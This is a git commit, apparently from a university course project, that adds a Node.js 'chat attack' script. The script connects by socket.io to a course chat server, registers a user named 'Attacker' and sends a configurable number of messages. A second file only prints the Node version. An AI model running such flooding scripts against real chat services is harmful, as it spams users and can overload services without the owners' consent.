36350aef4169a1a029a154cdc32aab3aa9f56818
Antonio Fontaine <afontaine@uc.cl>
2016-11-15 18:10:21 -0300

    chat attack done. Creates a user and sends message to the chat

---
+++ mainapp/chat_attack.js
@@ -0,0 +1,62 @@
+
+// Connect to server
+const io = require('socket.io-client');
+
+const socket = io.connect('http://assw7.ing.puc.cl/');
+
+
+const username = process.argv[2] || 'Attacker';
+let number_of_messages = process.argv[3] || 3;
+number_of_messages = parseInt(number_of_messages, 10);
+// Add a connect listener
+socket.on('connect', () => {
+  socket.emit('adduser', username);
+  for (let i = 0; i < number_of_messages; i++) {
+    socket.emit('sendchat', `message #${i}`);
+  }
+});
+
+
+//
+// var socket = io.connect('http://assw7.ing.puc.cl/');
+//
+// // on connection to server, ask for user's name with an anonymous callback
+// socket.on('connect', function () {
+//   // call the server-side function 'adduser' and send one parameter (value of prompt)
+//   socket.emit('adduser', '<%= user.username %>');
+// });
+//
+// // listener, whenever the server emits 'updatechat', this updates the chat body
+// socket.on('updatechat', function (username, data) {
+//   $('#conversation').append('<b>' + username + ':</b> ' + data + '<br>');
+// });
+//
+// // // listener, whenever the server emits 'updaterooms', this updates the room the client is in
+// socket.on('updaterooms', function (rooms, current_room) {
+//   // $('#rooms').empty(); $.each(rooms, function (key, value) {   if (value == current_room) {     $('#rooms').append('<li>' + value + '</li>');   } else {     $('#rooms').append('<li><a href="#" onclick="switchRoom(\'' + value + '\')">' + value +
+//   // '</a></li>');   } });
+// });
+//
+// function switchRoom(room) {
+//   $('#conversation').empty();
+//   socket.emit('switchRoom', room);
+// }
+//
+// // on load of page
+// $(function () {
+//   // when the client clicks SEND
+//   $('#datasend').click(function () {
+//     var message = $('#data').val();
+//     $('#data').val('');
+//     // tell server to execute 'sendchat' and send along one parameter
+//     socket.emit('sendchat', message);
+//   });
+//
+//   // when the client hits ENTER on their keyboard
+//   $('#data').keypress(function (e) {
+//     if (e.which == 13) {
+//       $(this).blur();
+//       $('#datasend').focus().click();
+//     }
+//   });
+// });
---
+++ mainapp/chat_overload.js
@@ -0,0 +1,9 @@
+const execFile = require('child_process').execFile;
+
+
+execFile('node', ['--version'], (error, stdout) => {
+  if (error) {
+    throw error;
+  }
+  console.log(stdout);
+});
